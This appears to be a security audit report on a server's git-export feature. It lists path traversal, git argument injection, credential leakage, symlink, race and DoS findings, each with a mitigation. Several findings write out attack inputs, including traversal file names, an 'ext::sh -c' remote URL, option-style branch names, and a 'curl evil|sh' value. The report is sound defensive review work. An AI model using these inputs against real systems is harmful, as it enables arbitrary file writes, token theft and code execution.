# H1 Git Export — Security Review

Scope: `packages/server/src/services/git-export.ts`,
`packages/server/src/services/git-export-runner.ts`,
`packages/server/src/services/git-export-config.ts`,
`packages/server/src/routes/git-export-routes.ts`.

Methodology: read-only STRIDE pass over the HTTP surface plus targeted
threats from the task brief (path traversal, command injection, symlink
attacks, credential leakage, DoS, SSRF, race conditions, credential
helper inheritance). Verified path.posix.join behavior on this host to
confirm traversal is reachable.

### Findings

- [critical] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:106-114 — Arbitrary file write outside the export subtree via unvalidated `row.topic` and `row.scopeId` concatenated into `relPath` ("factory/REFLECTIONS/${topic}.md", "products/${row.scopeId}/${kind}.md"). `path.posix.join(cfg.repoPath, relPath)` with a relPath containing leading `../../..` resolves outside repoPath (confirmed: `path.posix.join('/repo','../../etc/passwd')` → `/etc/passwd`). An attacker who can create a knowledge item with `scopeId = "../../../../etc"` or `topic = "../../../../../root/.ssh/authorized_keys"` causes `writePlanToDisk` to `mkdirSync` and `writeFileSync` anywhere the server user can write, then `git add -A` stages those paths. This is the single biggest risk in the whole surface. Mitigation: (a) reject any `scopeId`/`topic` containing `/`, `\`, `..`, or control chars at the knowledge-write boundary; AND (b) in `writePlanToDisk` compute `const resolved = path.posix.normalize(absPath); if (!resolved.startsWith(repoPath + "/")) throw` — defence in depth so a single-layer miss cannot escape.

- [critical] /workspace/.worktrees/H1/packages/server/src/routes/git-export-routes.ts:21 — `remoteUrl` is accepted as any non-null string with no scheme allow-list, no credential stripping, and no sanity check. Attack surfaces: (1) `git remote add origin "${remoteUrl}"` at /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:201 will accept `ext::sh -c ...`; while modern git gates `ext::` behind `protocol.ext.allow`, config keys in user `~/.gitconfig` can lift that; (2) any https URL exfiltrates the entire knowledge export to an attacker-controlled host (SSRF-style tunnel — STRIDE I); (3) embedded credentials (`https://user:token@host/...`) are stored verbatim in `factory_settings` and returned by `GET /config` (see next finding). Mitigation: validate scheme against `["https:","ssh:","git@"]` allow-list via `z.string().regex(...)`, strip userinfo, and reject `ext::`, `file://`, and any URL beginning with `-`.

- [critical] /workspace/.worktrees/H1/packages/server/src/routes/git-export-routes.ts:69 — `GET /config` returns the full `GitExportConfig` including `remoteUrl`, which commonly contains a PAT when using HTTPS pushes (`https://oauth2:ghp_xxx@github.com/...`). Any holder of the API key can exfiltrate the token. Mitigation: redact userinfo in GET responses (return `remoteUrlHost`/`remoteUrlPreview` with credentials stripped) and store the secret portion in a dedicated secret store or an env-var reference rather than `factory_settings`.

- [high] /workspace/.worktrees/H1/packages/server/src/services/git-export-runner.ts:62 — `logger.debug("git spawn", { args, cwd, timeoutMs })` logs full argv on every git invocation. For the `remoteAdd` call the argv contains `remoteUrl` verbatim, including any embedded PAT. With `LOG_LEVEL=debug` the token ends up in stdout/log aggregation. Mitigation: redact argv for `remote add`/`push` (e.g. mask anything that parses as a URL with userinfo) before logging.

- [high] /workspace/.worktrees/H1/packages/server/src/routes/git-export-routes.ts:23 — `branch` is only constrained by `z.string().min(1)`. It flows into `git init -b <branch>` and `git push --set-upstream origin <branch>` with no `--` separator (/workspace/.worktrees/H1/packages/server/src/services/git-export-runner.ts:126, 150). A branch named `--upload-pack=...`, `--receive-pack=...`, or `--exec=...` is interpreted as an option by git. Not RCE in current git because `push` parses refspecs positionally after the remote, but the historical class of bug (CVE-2017-1000117 family) is real and git's parsing changes per release. Mitigation: enforce `/^(?!-)[A-Za-z0-9._\/-]{1,200}$/` for branch; also add `"--"` before the branch token in `push` argv.

- [high] /workspace/.worktrees/H1/packages/server/src/services/git-export-config.ts:156-169 — `sanitizeRepoPath` rejects relative paths and `..` segments but does NOT canonicalize symlinks, does not reject `/etc`, `/root`, `/`, `/var/lib/*`, `/proc`, etc., and does not require the path to be empty or pre-created by the operator. Combined with `ensureRepo` (/workspace/.worktrees/H1/packages/server/src/services/git-export.ts:187-202), an attacker with API access can set `repoPath = "/etc"`, skip the mkdir (existsSync true), and run `git init -b main` inside `/etc`, creating `/etc/.git` and later committing arbitrary files into system directories. `fs.existsSync` follows symlinks, so a symlink pre-planted at any path the server can read also lands the init inside the target. Mitigation: require repoPath to either (a) not exist (so we create it fresh with known perms) or (b) already be a git repo we previously initialized (check for marker file such as `.hyperidle-export`); reject any path resolving under `/etc`, `/root`, `/proc`, `/sys`, `/var`, `/usr`, `/bin`, `/boot`, `/dev`; use `fs.lstatSync` to reject symlinks; store and verify the realpath.

- [high] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:209-226 — `writePlanToDisk` unconditionally overwrites any existing file at the computed path. If `repoPath` is a live repo the operator cares about (not a dedicated export-only dir), the exporter silently stomps user-authored content under `factory/` or `products/<scope>/`. Combined with the traversal finding above, this becomes arbitrary overwrite of any file the server user owns. Mitigation: on first run write a sentinel file (`.hyperidle-export.json` with version + created-at); refuse to write unless the sentinel is present and unchanged, OR unless repoPath was empty at init.

- [high] /workspace/.worktrees/H1/packages/server/src/services/git-export-runner.ts:64-73 — The spawn env inherits `process.env` wholesale and does not set `GIT_CONFIG_NOSYSTEM=1`, does not clear `HOME`/`XDG_CONFIG_HOME`, and does not unset `GIT_CONFIG_GLOBAL`. Any `credential.helper`, `core.sshCommand`, `core.gitProxy`, `http.proxy`, `core.fsmonitor`, `core.pager`, or `uploadpack.packObjectsHook` present in the user's `~/.gitconfig` or `/etc/gitconfig` is inherited. On a shared host an attacker who can write `~/.gitconfig` (or who pre-configured a malicious `credential.helper`) can exfiltrate credentials or achieve RCE on push. Separately, `GIT_ASKPASS=/bin/true` returns empty string not failure, so some credential helpers (e.g. libsecret) will still be consulted. Mitigation: spawn git with `env: { PATH, GIT_TERMINAL_PROMPT: "0", GIT_ASKPASS: "/bin/false", GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null", HOME: cfg.repoPath }` — minimum env, no user-config inheritance, `/bin/false` so the helper fails closed. Document that auth must go through SSH keys or a scoped credential file placed explicitly by config.

- [high] /workspace/.worktrees/H1/packages/server/src/services/git-export-config.ts:110-128 — `updateGitExportConfig` performs per-field upserts without wrapping them in a transaction. A concurrent `runGitExport` reading via `loadGitExportConfig` can observe a torn config (new `remoteUrl` with old `branch`, or new `repoPath` mid-write). A concurrent second PATCH interleaves field writes with the first. Combined with the sanitizeRepoPath bypass, torn state between `repoPath` validation at the route and `readAllSettings` at export time is reachable. Mitigation: wrap all upserts in `db.transaction(() => { ... })`; run the export config read inside the mutex with the same transaction.

- [medium] /workspace/.worktrees/H1/packages/server/src/routes/git-export-routes.ts:71, 89 — No body-size limit on PATCH /config or POST /run, and no route-level rate limit. Hono accepts arbitrarily large JSON by default. Pair this with /knowledge writes that have no body cap (verified: no `bodyLimit`/`maxBytes` anywhere in packages/server/src) and an attacker can push GB-scale knowledge items that `writePlanToDisk` will happily write to disk, exhausting inode/disk. DoS — STRIDE D. Mitigation: add Hono `bodyLimit` middleware (e.g. 64 KiB for these routes); cap `knowledgeItems.body` length at insert time; cap total export size per run and short-circuit with an error if exceeded.

- [medium] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:359-372 — Debounce state is in-process only. A single attacker with API access can invoke `POST /api/git-export/run` in a tight loop (no rate limit) bypassing the debounce and forcing a git commit+push per request. Each push is bounded by `DEFAULT_PUSH_MS = 30_000` so concurrent /run calls serialize through `queueMutex` but still pin the worker. DoS and cost amplification (bandwidth to the remote, disk IO). Mitigation: add route-level rate limit on /run (e.g. 1/minute); reuse the debounce window for /run as well.

- [medium] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:288 — `authorName` and `authorEmail` are interpolated into `-c user.name=${authorName}` / `-c user.email=${authorEmail}`. Git's `-c` splits on the first `=` so extra `=` in the value are safe, but newlines and embedded git-config syntax still flow through. A crafted `authorName` like `foo\n[core]\nsshCommand=curl evil|sh` is treated as a single string value, so this is not directly injectable into git's config parser — however emails with `<`, `>`, or `\n` end up in commit headers and the log footer. Mitigation: enforce `authorName` matches `/^[^<>\n\r]{1,100}$/` and `authorEmail` matches a standard email regex at the PATCH boundary.

- [medium] /workspace/.worktrees/H1/packages/server/src/routes/git-export-routes.ts:17-27 — Schema accepts `debounceMs` as any non-negative integer with no upper bound. `debounceMs = 2^31 - 1` is ~25 days, silently disabling event-driven export. Also `repoPath`, `branch`, `authorName`, `authorEmail` have no max length — a multi-MB `authorName` is persisted to `factory_settings`. Mitigation: add `.max(...)` bounds on every string, `.max(3_600_000)` (1h) on debounceMs.

- [medium] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:294-304 — On push failure the code logs `String(err)`. The runner's error message (git-export-runner.ts:117) includes captured stderr, which for auth failures typically contains the remote URL. Error bodies returned from `POST /run` (git-export-routes.ts:106) echo `result.error` to the API caller. A holder of the API key sees stderr that may contain token-bearing URLs. Mitigation: redact URLs in error strings before returning from `runGitExport` and before logging.

- [low] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:274 — `runner.add([])` uses `git add -A` with no pathspec. If repoPath coincidentally contains other files (user's local scratch, a `.env` dropped in by accident) they are all staged and pushed. Mitigation: stage only the computed `filesChanged` paths via `add([...filesChanged])`; add a `.gitignore` to the export root that excludes `*.env`, secrets, and anything outside `products/` + `factory/`.

- [low] /workspace/.worktrees/H1/packages/server/src/services/git-export-config.ts:74-76 — `readGitExportConfig` returns the raw `remoteUrl` to callers; anywhere it is serialized (GET /config, /status currently omits it but could change, future webhooks, logs) inherits the same leakage. Mitigation: centralize redaction on read so callers cannot accidentally expose secrets.

- [low] /workspace/.worktrees/H1/packages/server/src/services/git-export-runner.ts:87 — SIGKILL on timeout without prior SIGTERM can leave the git index locked (`.git/index.lock`). Subsequent runs error in `commit` phase until operator intervention. Repudiation angle (R) — no audit log row is written when a run is killed. Mitigation: SIGTERM first with a grace window, then SIGKILL; on startup, detect stale `.git/index.lock` older than the timeout and clear it.

- [info] /workspace/.worktrees/H1/packages/server/src/app.ts:58, 77 — Verified `authMiddleware` is mounted on `*` before `/git-export` is registered, so all four routes are auth-gated behind the API key. Single-key auth means compromise of `HYPERIDLE_API_KEY` grants full git-export control; out of scope for this review but noted as the weakest link.

- [info] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:173-179 — Single-process mutex is explicit (`@lore`); multi-node against the same repo is undefined. If the deployment ever scales horizontally, concurrent pushes will race. Out of scope for v1 per the lore comment.

- [info] /workspace/.worktrees/H1/packages/server/src/services/git-export.ts:85-94 — Commit message embeds `e.title` verbatim. Title is agent-authored so prompt-injection text ends up in git history. Not a code-execution risk (commit `-m` is a single argv), but git-log viewers that render ANSI or markdown are a secondary surface. Acceptable for v1.

### OK

- Parameterized git invocation through `spawn("git", args, ...)` with `shell: false` default — no shell metacharacter injection at the process boundary (git-export-runner.ts:64).
- `zValidator` rejects unknown fields via `.strict()` on both PATCH /config and POST /run.
- Drizzle usage is fully parameterized; no raw SQL in scope.
- `authMiddleware` is applied to all four /git-export routes (verified in app.ts:58 mounted before route registration at :77).
- `repoPath` sanitizer correctly rejects relative paths and `..` segments (insufficient by itself — see [high] above — but the check itself is sound).
- `queueMutex` correctly chains promises and catches predecessor rejections so a single failure cannot starve the queue.
- `runGitExport` never throws — it returns a tagged union, matching the documented contract.
- `computeExportPlan` is pure over the DB and does no I/O; test surface is clean.
- `debounceMs` parse in git-export-config.ts:45-50 defends against NaN and negatives.
- Push is gated on a non-empty `remoteUrl`; local-only configurations never reach the network.
- `force:true` on POST /run only affects init-phase behavior; it does not bypass `sanitizeRepoPath` (route validates before calling service).
